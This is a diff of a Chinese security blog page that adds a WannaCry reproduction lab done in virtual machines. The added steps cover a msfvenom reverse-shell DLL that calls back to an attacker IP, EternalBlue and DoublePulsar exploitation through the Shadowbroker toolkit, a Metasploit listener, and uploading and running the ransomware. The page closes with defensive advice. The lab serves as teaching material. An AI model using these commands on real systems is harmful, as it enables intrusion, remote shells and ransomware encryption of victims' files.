@@ -28,22 +28,42 @@
 <meta property="og:site_name" content="v5le0n9&#39;s garden">
 <meta property="og:description" content="WannaCry复现过程十分繁琐，仅推荐大家理解漏洞利用的基本过程，Python时如何构建shellcode代码攻击的，以及双星脉冲漏洞、DLL文件的设置与后续逆向分析均有关。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/posts/undefined/1.1.1.png">
-<meta property="og:image" content="http://example.com/posts/undefined/1.1.2.png">
-<meta property="og:image" content="http://example.com/posts/undefined/1.1.3.jpg">
-<meta property="og:image" content="http://example.com/posts/undefined/3.1.1.png">
-<meta property="og:image" content="http://example.com/posts/undefined/3.1.2.png">
-<meta property="og:image" content="http://example.com/posts/undefined/3.1.3.png">
-<meta property="og:image" content="http://example.com/posts/undefined/3.1.4.png">
-<meta property="og:image" content="http://example.com/posts/undefined/3.1.5.png">
-<meta property="og:image" content="http://example.com/posts/undefined/3.1.6.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/1.1.1.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/1.1.2.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/1.1.3.jpg">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.1.1.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.1.2.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.1.3.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.1.4.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.1.5.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.1.6.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.1.7.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.1.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.2.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.3.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.1.8.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.4.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.5.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.6.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.7.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.8.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.9.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.10.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.11.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.12.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.13.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.16.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.17.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.18.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.14.png">
+<meta property="og:image" content="http://example.com/posts/9784e9fe/3.2.15.png">
 <meta property="article:published_time" content="2022-07-11T10:20:52.864Z">
-<meta property="article:modified_time" content="2022-07-12T13:29:37.663Z">
+<meta property="article:modified_time" content="2022-07-13T10:25:09.443Z">
 <meta property="article:author" content="v5le0n9">
 <meta property="article:tag" content="漏洞复现">
 <meta property="article:tag" content="样本分析">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/posts/undefined/1.1.1.png">
+<meta name="twitter:image" content="http://example.com/posts/9784e9fe/1.1.1.png">
 
 <link rel="canonical" href="http://example.com/posts/9784e9fe.html">
 
@@ -232,7 +252,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-12 21:29:37" itemprop="dateModified" datetime="2022-07-12T21:29:37+08:00">2022-07-12</time>
+                <time title="修改时间：2022-07-13 18:25:09" itemprop="dateModified" datetime="2022-07-13T18:25:09+08:00">2022-07-13</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -257,14 +277,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.7k</span>
+              <span>3.1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -279,15 +299,15 @@
         <p>WannaCry复现过程十分繁琐，仅推荐大家理解漏洞利用的基本过程，Python时如何构建shellcode代码攻击的，以及双星脉冲漏洞、DLL文件的设置与后续逆向分析均有关。</p>
 <span id="more"></span>
 <p>下图是安天分析WannaRen勒索软件的攻击流程，其名称和功能与WannaCry相似。</p>
-<img src="/posts/undefined/1.1.1.png" class="" title="勒索病毒攻击过程">
+<img src="/posts/9784e9fe/1.1.1.png" class="" title="勒索病毒攻击过程">
 <h1 id="1-WannaCry背景"><a href="#1-WannaCry背景" class="headerlink" title="1. WannaCry背景"></a>1. WannaCry背景</h1><p>2017年5月12日，WannaCry蠕虫通过永恒之蓝MS17-010漏洞在全球范围大爆发，感染大量的计算机。WannaCry勒索病毒全球大爆发，至少150个国家、30万名用户中招，造成损失达80亿美元，已影响金融、能源、医疗、教育等众多行业，造成严重的危害。</p>
 <p>WannaCry是一种“蠕虫式”勒索病毒软件，由不法分子利用NSA泄露方程式工具包的危险漏洞“EternalBlue”（永恒之蓝）进行传播。该蠕虫感染计算机后会向计算机中植入敲诈者病毒，导致电脑大量文件被加密。</p>
 <p>WannaCry利用Windows系统的SMB漏洞获取系统的最高权限，该工具通过恶意代码扫描开放445端口的Windows系统。被扫描到的Windows系统，只要开机上线，不需要用户进行任何操作，即可通过SMB漏洞上传WannaCry勒索病毒等恶意程序。</p>
-<img src="/posts/undefined/1.1.2.png" class="" title="勒索病毒">
+<img src="/posts/9784e9fe/1.1.2.png" class="" title="勒索病毒">
 <p>WannaCry利用永恒之蓝漏洞进行网络端口扫描攻击，目标机器被成功攻陷后会从攻击机下载WannaCry蠕虫进行感染，并作为攻击机再次扫描互联网和局域网的其它机器，形成蠕虫感染大范围超快速扩散。</p>
 <p>木马母体为<code>mssecsvc.exe</code>，运行后会扫描随机IP的互联网机器，尝试感染，也会扫描局域网相同网段的机器进行感染传播，此外会释放敲诈者程序<code>tasksche.exe</code>，对磁盘文件进行加密勒索。</p>
 <p>木马加密使用AES加密文件，并使用非对称加密算法RSA 2048加密随机密钥，每个文件使用一个随机密钥，理论上不可攻破。同时<code>@WanaDecryptor@.exe</code>显示勒索界面。其核心流程如下图所示：</p>
-<img src="/posts/undefined/1.1.3.jpg" class="" title="勒索病毒核心流程">
+<img src="/posts/9784e9fe/1.1.3.jpg" class="" title="勒索病毒核心流程">
 <p>WannaCry勒索病毒主要行为是传播和勒索：</p>
 <ul>
 <li>传播：利用基于445端口的SMB漏洞MS17-010(永恒之蓝)进行传播</li>
@@ -313,19 +333,81 @@
 </ol>
 <h1 id="3-实验复现"><a href="#3-实验复现" class="headerlink" title="3. 实验复现"></a>3. 实验复现</h1><p><strong>实验复现过程必须在虚拟机中完成，运行之前关闭虚拟机Win 7的文件共享。</strong></p>
 <h2 id="3-1-实验准备"><a href="#3-1-实验准备" class="headerlink" title="3.1 实验准备"></a>3.1 实验准备</h2><p>关闭Win 7虚拟机的文件共享，开启445端口，同时关闭防火墙。</p>
-<img src="/posts/undefined/3.1.1.png" class="" title="关闭文件共享">
-<img src="/posts/undefined/3.1.2.png" class="" title="开启445端口">
-<img src="/posts/undefined/3.1.3.png" class="" title="开启445端口">
+<img src="/posts/9784e9fe/3.1.1.png" class="" title="关闭文件共享">
+<img src="/posts/9784e9fe/3.1.2.png" class="" title="开启445端口">
+<img src="/posts/9784e9fe/3.1.3.png" class="" title="开启445端口">
 <p>在Windows Server 2003系统中配置Python环境。</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://www.python.org/download/releases/2.6/">Python 2.6</a></li>
 <li><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/">Python32-221.win32-py2.6</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/misterch0c/shadowbroker">Shadowbroker-master工具包</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/misterch0c/shadowbroker">Shadowbroker工具包</a></li>
 </ul>
-<img src="/posts/undefined/3.1.4.png" class="" title="配置环境变量">
-<img src="/posts/undefined/3.1.5.png" class="" title="配置Python环境">
-<img src="/posts/undefined/3.1.6.png" class="" title="配置Python环境">
-<p>安装Shadowbroker-master，在Windows文件夹中新建文件夹<code>logs</code>和<code>listeningposts</code>，用记事本打开Windows文件夹中的<code>Fuzzbunch.xml</code>文件，并修改<code>ResourcesDir</code>和<code>LOogDir</code>的路径。</p>
+<img src="/posts/9784e9fe/3.1.4.png" class="" title="配置环境变量">
+<img src="/posts/9784e9fe/3.1.5.png" class="" title="配置Python环境">
+<img src="/posts/9784e9fe/3.1.6.png" class="" title="配置Python环境">
+<p>下载shadowbroker工具包，在windows文件夹中新建文件夹<code>logs</code>和<code>listeningposts</code>，用记事本打开windows文件夹中的<code>Fuzzbunch.xml</code>文件，并修改<code>ResourcesDir</code>和<code>LogDir</code>的路径为：C:\shadowbroker\windows\Resources和logs。注意，目录名不能有空格。</p>
+<img src="/posts/9784e9fe/3.1.7.png" class="" title="新建文件夹和修改路径">
+<h2 id="3-2-实验过程"><a href="#3-2-实验过程" class="headerlink" title="3.2 实验过程"></a>3.2 实验过程</h2><h3 id="3-2-1-提权"><a href="#3-2-1-提权" class="headerlink" title="3.2.1 提权"></a>3.2.1 提权</h3><p>用Kali扫描靶机是否开启445端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn 192.168.193.141</span><br></pre></td></tr></table></figure>
+<img src="/posts/9784e9fe/3.2.1.png" class="" title="445端口">
+<p>使用msfvenom工具生成后门文件<code>abc.dll</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.193.128 LPORT=6666 -f dll &gt; abc.dll</span><br></pre></td></tr></table></figure>
+<p>其中，-p指定使用模块类型，-f指定文件类型。</p>
+<img src="/posts/9784e9fe/3.2.2.png" class="" title="生成后门文件">
+<p>将<code>abc.dll</code>上传到Windows Server 2003中。</p>
+<img src="/posts/9784e9fe/3.2.3.png" class="" title="abc.dll">
+<p>在Windows Server 2003运行永恒之蓝工具，若出现以下界面则工具安装成功。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python C:\shadowbroker\windows\fb.py</span><br></pre></td></tr></table></figure>
+<img src="/posts/9784e9fe/3.1.8.png" class="" title="安装永恒之蓝工具">
+<p>设置靶机IP、攻击机1的IP(反弹shell地址)、重定向以及新建项目名称等。重定向一定选no。其他选项默认，Enter即可。</p>
+<img src="/posts/9784e9fe/3.2.4.png" class="" title="设置参数">
+<p>加载永恒之蓝模块，获取受害主机的系统权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use Eternalblue</span><br></pre></td></tr></table></figure>
+<img src="/posts/9784e9fe/3.2.5.png" class="" title="设置参数">
+<p>设置受害主机操作系统Win 7 x64，设置模式FB，该模式下进行交互性参数输入。</p>
+<img src="/posts/9784e9fe/3.2.6.png" class="" title="设置参数">
+<img src="/posts/9784e9fe/3.2.7.png" class="" title="设置参数">
+<p>当看到WIN和Eternalblue Succeeded信息，表示受害主机的权限获取成功。</p>
+<img src="/posts/9784e9fe/3.2.8.png" class="" title="设置参数">
+<p>接着设置Kali系统，通过Metasploit等待返回的shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole	#加载msf框架</span><br><span class="line">use exploit/multi/handler	#使用handler操作</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp	#设置payload</span><br><span class="line">set LHOST 192.168.193.128	#设置本地IP</span><br><span class="line">set LPORT 6666	#设置本地端口</span><br><span class="line">run	#开启监听</span><br></pre></td></tr></table></figure>
+<img src="/posts/9784e9fe/3.2.9.png" class="" title="监听本地端口">
+<p>在Windows Server 2003中进行Doublepulsar注入(双倍脉冲)，具体流程如下：</p>
+<p>输入<code>use Doublepulsar</code>加载双倍脉冲注入。设置相关参数，包括选择SMB协议，后门利用方法为RunDLL。</p>
+<img src="/posts/9784e9fe/3.2.10.png" class="" title="设置参数">
+<img src="/posts/9784e9fe/3.2.11.png" class="" title="设置参数">
+<img src="/posts/9784e9fe/3.2.12.png" class="" title="设置参数">
+<p>回到Kali查看meterpreter，此时成功获取受害主机的shell。</p>
+<img src="/posts/9784e9fe/3.2.13.png" class="" title="反弹shell">
+<h3 id="3-2-2-上传勒索病毒"><a href="#3-2-2-上传勒索病毒" class="headerlink" title="3.2.2 上传勒索病毒"></a>3.2.2 上传勒索病毒</h3><p>获得权限后，将勒索病毒<code>wcry.exe</code>上传至受害主机。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/v5le0n9/Desktop/wcry2.0/wcry.exe c:\\</span><br></pre></td></tr></table></figure>
+<img src="/posts/9784e9fe/3.2.16.png" class="" title="上传勒索病毒">
+<p>获取受害主机的shell，如果出现中文乱码输入<code>chcp 65001</code>设置编码，接着运行<code>wcry.exe</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">chcp 65001</span><br><span class="line">wcry.exe</span><br></pre></td></tr></table></figure>
+<img src="/posts/9784e9fe/3.2.17.png" class="" title="运行勒索病毒">
+<p>运行病毒程序后的界面如下图所示，已经成功被勒索。</p>
+<img src="/posts/9784e9fe/3.2.18.png" class="" title="勒索病毒">
+<p>加密系统中的文件，被加密的文件后缀名统一修改为<code>.WNRY</code>。</p>
+<ul>
+<li>b.wnry：中招后的桌面壁纸</li>
+<li>c.wnry：配置文件，包含洋葱域名、比特币地址、tor下载地址等</li>
+<li>f.wnry：可免支付解密的文件列表</li>
+<li>r.wnry：提示文件，包含中招提示信息</li>
+<li>s.wnry：zip文件，包含tor客户端</li>
+<li>t.wnry：测试文件</li>
+<li>u.wnry：解密程序</li>
+</ul>
+<img src="/posts/9784e9fe/3.2.14.png" class="" title="程序加密后">
+<img src="/posts/9784e9fe/3.2.15.png" class="" title="提示信息">
+<h1 id="4-防御措施"><a href="#4-防御措施" class="headerlink" title="4. 防御措施"></a>4. 防御措施</h1><p>勒索软件常见防御措施如下：</p>
+<ul>
+<li>开启系统防火墙</li>
+<li>关闭445、139等端口连接</li>
+<li>开启系统自动更新，下载并更新补丁，及时修复漏洞</li>
+<li>安装安全软件，开启主动防御进行拦截查杀</li>
+<li>如非服务需要，建议把高危漏洞的端口都关闭，比如138、139、445、3389等</li>
+</ul>
+<p>由于WannaCry勒索病毒主要通过445端口入侵计算机，关闭方法可在Windows防火墙中添加入站规则，禁止通过445端口连接。</p>
 
     </div>
 
@@ -369,7 +451,10 @@
     <a href="/posts/2ae8b8b2.html" rel="prev" title="CVE-2020-0601漏洞复现及防御机制">
       <i class="fa fa-chevron-left"></i> CVE-2020-0601漏洞复现及防御机制
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/posts/11f48b75.html" rel="next" title="外部威胁防护和勒索病毒对抗">
+      外部威胁防护和勒索病毒对抗 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -429,7 +514,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-WannaCry%E8%83%8C%E6%99%AF"><span class="nav-text">1. WannaCry背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">2. 实验环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">2.1 环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E5%AE%9E%E9%AA%8C%E5%B7%A5%E5%85%B7"><span class="nav-text">2.2 实验工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="nav-text">2.3 实验步骤</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0"><span class="nav-text">3. 实验复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-%E5%AE%9E%E9%AA%8C%E5%87%86%E5%A4%87"><span class="nav-text">3.1 实验准备</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-WannaCry%E8%83%8C%E6%99%AF"><span class="nav-text">1. WannaCry背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">2. 实验环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">2.1 环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E5%AE%9E%E9%AA%8C%E5%B7%A5%E5%85%B7"><span class="nav-text">2.2 实验工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="nav-text">2.3 实验步骤</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0"><span class="nav-text">3. 实验复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-%E5%AE%9E%E9%AA%8C%E5%87%86%E5%A4%87"><span class="nav-text">3.1 实验准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="nav-text">3.2 实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-1-%E6%8F%90%E6%9D%83"><span class="nav-text">3.2.1 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-2-%E4%B8%8A%E4%BC%A0%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92"><span class="nav-text">3.2.2 上传勒索病毒</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-text">4. 防御措施</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -445,7 +530,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-count">55</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -509,12 +594,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">999k</span>
+    <span title="站点总字数">1m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">15:08</span>
+    <span title="站点阅读时长">15:11</span>
 </div>
 
         
